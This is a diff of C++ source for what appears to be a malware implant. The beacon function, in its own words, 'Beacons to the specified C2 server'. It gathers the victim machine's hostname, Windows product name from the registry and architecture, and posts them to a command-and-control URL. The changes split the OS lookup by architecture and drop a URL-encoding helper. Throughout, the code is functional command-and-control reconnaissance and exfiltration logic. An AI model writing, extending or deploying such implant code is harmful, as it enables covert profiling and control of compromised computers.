@@ -8,7 +8,8 @@
 // Function prototypes
 wstring beacon(wstring &beaconURL);
 wstring getHostname();
-wstring getOS();
+wstring get32BitOS();
+wstring get64BitOS();
 wstring getArchitecture();
 string utf8Encode(const wstring &postData);
 string urlEncode(const string &unencoded);
@@ -42,9 +43,32 @@ wstring getHostname()
 
 
 
-// Gets the system OS - Working as of 06/06/16
+// Gets the system OS for x86 systems - Working as of 06/07/16
 // Returns "os" wstring
-wstring getOS()
+wstring get32BitOS()
+{
+	HKEY hRegistry = NULL;
+	RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", &hRegistry); // Opens a handle to the Registry
+
+	DWORD size;
+	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, NULL, &size); // Queries the size (in bytes) for the "ProductName" Registry key - Will save size (in bytes) including null-terminator in "size" DWORD
+
+	wchar_t buffer[256] = L""; // EWWWW ...HARD-CODED ARRAY SIZE
+	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, (LPBYTE)&buffer, &size); // Queries the "ProductName" Registry key and stores output in buffer
+
+	wstring os = buffer; // Creates new "os" wstring and sets value to the wchar_t array buffer above
+
+	RegCloseKey(hRegistry); // Closes the Registry handle
+
+	return os; // Returns the "os" wstring to the calling function
+}
+// End of get32BitOS() function
+
+
+
+// Gets the system OS for x64 systems - Working as of 06/07/16
+// Returns "os" wstring
+wstring get64BitOS()
 {
 	HKEY hRegistry = NULL;
 	RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion", &hRegistry); // Opens a handle to the Registry
@@ -61,7 +85,7 @@ wstring getOS()
 
 	return os; // Returns the "os" wstring to the calling function
 }
-// End of getOS() function
+// End of get64BitOS() function
 
 
 
@@ -101,32 +125,6 @@ string utf8Encode(const wstring &postData)
 
 
 
-// Code modified from http://www.zedwood.com/article/cpp-urlencode-function - Working as of 06/07/16
-// Takes a string and URL encodes it
-// Returns URL-encoded "encoded" string
-string urlEncode(const string &unencoded)
-{
-	const string unreserved = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.~"; // Unreserved characters per RFC
-	string encoded;
-
-	for (size_t i = 0; i < unencoded.length(); i++) // Loops through all characters
-	{
-		if (unreserved.find_first_of(unencoded[i]) != string::npos)
-			encoded.push_back(unencoded[i]);
-		else
-		{
-			encoded.append("%");
-			char buf[3];
-			sprintf_s(buf, "%.2X", unencoded[i]);
-			encoded.append(buf);
-		}
-	}
-	return encoded; // Returns URL-encoded string
-}
-// End of urlEncode() function
-
-
-
 // Beacons to the specified C2 server
 // Returns "response" wstring
 wstring beacon(wstring &beaconURL)
@@ -135,9 +133,18 @@ wstring beacon(wstring &beaconURL)
 
 	beacon.SetProxy(L"127.0.0.1:9999");	// DEBUGGING - REMOVE LATER
 
-	string data = "hostname=" + urlEncode(utf8Encode(getHostname())) + "&os=" + urlEncode(utf8Encode(getOS())) + "&architecture=" + urlEncode(utf8Encode(getArchitecture())); // URL-encoded POST data
-	beacon.SetAdditionalDataToSend((BYTE *)data.c_str(), data.size());
+	string data;
 
+	if (getArchitecture() == L"x86") // If system architecture is x86 so we need to call the 32-bit version of getOS()
+	{
+		data = "hostname=" + utf8Encode(getHostname()) + "&os=" + utf8Encode(get32BitOS()) + "&architecture=" + utf8Encode(getArchitecture()); // POST data
+	}
+	else // Else system architecture is x64 so we need to call the 64-bit version of getOS()
+	{
+		data = "hostname=" + utf8Encode(getHostname()) + "&os=" + utf8Encode(get64BitOS()) + "&architecture=" + utf8Encode(getArchitecture()); // POST data
+	}
+	
+	beacon.SetAdditionalDataToSend((BYTE *)data.c_str(), data.size());
 	wstring contentLength = to_wstring(data.length()); // We need to create new wstring for the Content-Length so we can append to the other headers
 
 	wstring headers = L"Content-Length: ";
